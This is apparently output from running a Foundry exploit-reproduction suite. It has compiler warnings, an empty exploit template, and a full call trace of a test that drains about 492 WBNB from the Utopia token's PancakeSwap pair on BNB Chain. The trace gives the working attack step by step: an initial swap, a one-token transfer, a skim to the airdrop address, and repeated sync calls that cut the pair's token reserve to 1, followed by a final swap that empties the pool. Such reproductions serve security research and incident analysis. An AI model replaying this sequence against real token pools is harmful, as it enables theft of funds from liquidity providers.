Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.34s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/Utopia_exp.sol:24:5:
   |
24 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 300.12ms (108.49µs CPU time)

Ran 1 test for src/test/2023-07/Utopia_exp.sol:UtopiaTest
[PASS] testExploit() (gas: 682149)
Logs:
  Attacker WBNB balance before exploit: 0.010000000000000000
  Attacker WBNB balance after exploit: 492.088605739133158123

Traces:
  [857952] UtopiaTest::testExploit()
    ├─ [2534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c])
    │   └─ ← [Return] [0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c], []
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x000000000000000000000000000000000000000000000000002386f26fc10000)
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10000000000000000 [1e16]
    ├─ [24420] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24653] Utopia::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10000000000000000 [1e16]
    ├─ [2444] WBNB::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance before exploit", val: 10000000000000000 [1e16], decimals: 18)
    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10000000000000000 [1e16]
    ├─ [183597] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(10000000000000000 [1e16], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xb1da08C472567eb0EC19639b1822F578d39F3333], UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1689831488 [1.689e9])
    │   ├─ [8225] WBNB::transferFrom(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], 10000000000000000 [1e16])
    │   │   ├─ emit Transfer(from: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 10000000000000000 [1e16])
    │   │   └─ ← [Return] true
    │   ├─ [2604] Utopia::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2893] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 1768838349283261391642 [1.768e21], 507494915442740086636 [5.074e20], 1689830206 [1.689e9]
    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
    │   ├─ [159045] Pair::swap(34766487705582530 [3.476e16], 0, UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [124595] Utopia::transfer(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 34766487705582530 [3.476e16])
    │   │   │   ├─ emit Transfer(from: 0x7e60087331970B3C52e4B7E5b1ffBffFb5F77bfE, to: 0x7e60087331970B3C52e4B7E5b1ffBffFb5F77bfE, value: 1)
    │   │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333], value: 347664877055825 [3.476e14])
    │   │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: 0x000000000000000000000000000000000000dEaD, value: 347664877055825 [3.476e14])
    │   │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 34071157951470880 [3.407e16])
    │   │   │   ├─ [2439] Pair::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   │   │   ├─ [2600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
    │   │   │   │   └─ ← [Return] 276183063853411415 [2.761e17]
    │   │   │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   │   │   └─ ← [Return] true
    │   │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   │   └─ ← [Return] 1768803582795555809112 [1.768e21]
    │   │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
    │   │   ├─ emit Sync(reserve0: 1768803582795555809112 [1.768e21], reserve1: 507504915442740086636 [5.075e20])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 10000000000000000 [1e16], amount0Out: 34766487705582530 [3.476e16], amount1Out: 0, to: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [604] Utopia::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 34071157951470880 [3.407e16]
    │   └─ ← [Stop] 
    ├─ [91210] Utopia::transfer(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], 1)
    │   ├─ [893] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 1768803582795555809112 [1.768e21], 507504915442740086636 [5.075e20], 1689830488 [1.689e9]
    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
    │   ├─ emit Transfer(from: 0xfF2651B286694eD2fD2Fc8907f0E5DA6fC7159bD, to: 0xfF2651B286694eD2fD2Fc8907f0E5DA6fC7159bD, value: 1)
    │   ├─ emit Transfer(from: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 1)
    │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   ├─ [600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
    │   │   └─ ← [Return] 276183063853411415 [2.761e17]
    │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   └─ ← [Return] true
    ├─ [448] Utopia::lastAirdropAddress() [staticcall]
    │   └─ ← [Return] 0xfF2651B286694eD2fD2Fc8907f0E5DA6fC7159bD
    ├─ [55084] Pair::skim(0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD)
    │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 1768803582795555809113 [1.768e21]
    │   ├─ [41217] Utopia::transfer(0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD, 1)
    │   │   ├─ [2537] Pair::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 1)
    │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: 0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD, value: 1)
    │   │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   │   ├─ [600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
    │   │   │   └─ ← [Return] 276183063853411415 [2.761e17]
    │   │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   │   └─ ← [Return] true
    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
    │   ├─ [5262] WBNB::transfer(0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD, 0)
    │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: 0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD, value: 0)
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [9050] Pair::sync()
    │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
    │   ├─ emit Sync(reserve0: 0, reserve1: 507504915442740086636 [5.075e20])
    │   └─ ← [Stop] 
    ├─ [80031] Utopia::transfer(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], 1)
    │   ├─ [893] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 0, 507504915442740086636 [5.075e20], 1689830488 [1.689e9]
    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
    │   ├─ emit Transfer(from: 0x7fa9385Be102Ac3eaC297483dD6233D62A7511b7, to: 0x7fa9385Be102Ac3eaC297483dD6233D62A7511b7, value: 1)
    │   ├─ emit Transfer(from: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 1)
    │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   ├─ [600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
    │   │   └─ ← [Return] 276183063853411415 [2.761e17]
    │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   └─ ← [Return] true
    ├─ [9050] Pair::sync()
    │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
    │   ├─ emit Sync(reserve0: 1, reserve1: 507504915442740086636 [5.075e20])
    │   └─ ← [Stop] 
    ├─ [893] Pair::getReserves() [staticcall]
    │   └─ ← [Return] 1, 507504915442740086636 [5.075e20], 1689830488 [1.689e9]
    ├─ [1021] Router::getAmountOut(32, 1, 507504915442740086636 [5.075e20]) [staticcall]
    │   └─ ← [Return] 492088605739133158123 [4.92e20]
    ├─ [81481] Utopia::transfer(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], 32)
    │   ├─ [537] Pair::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [893] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 1, 507504915442740086636 [5.075e20], 1689830488 [1.689e9]
    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
    │   ├─ emit Transfer(from: 0xfEEf619a56FCe9D003E20bF61393D18f627133b4, to: 0xfEEf619a56FCe9D003E20bF61393D18f627133b4, value: 1)
    │   ├─ emit Transfer(from: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 32)
    │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   ├─ [600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
    │   │   └─ ← [Return] 276183063853411415 [2.761e17]
    │   ├─ [439] Pair::totalSupply() [staticcall]
    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
    │   └─ ← [Return] true
    ├─ [39501] Pair::swap(0, 492088605739133158123 [4.92e20], UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [23162] WBNB::transfer(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 492088605739133158123 [4.92e20])
    │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 492088605739133158123 [4.92e20])
    │   │   └─ ← [Return] true
    │   ├─ [619] UtopiaTest::pancakeCall(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 492088605739133158123 [4.92e20], 0x00)
    │   │   └─ ← [Stop] 
    │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 33
    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
    │   │   └─ ← [Return] 15416309703606928513 [1.541e19]
    │   ├─ emit Sync(reserve0: 33, reserve1: 15416309703606928513 [1.541e19])
    │   ├─ emit Swap(sender: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 32, amount1In: 0, amount0Out: 0, amount1Out: 492088605739133158123 [4.92e20], to: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 492088605739133158123 [4.92e20]
    ├─ [444] WBNB::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance after exploit", val: 492088605739133158123 [4.92e20], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 545.80ms (6.65ms CPU time)

Ran 2 test suites in 547.22ms (845.92ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
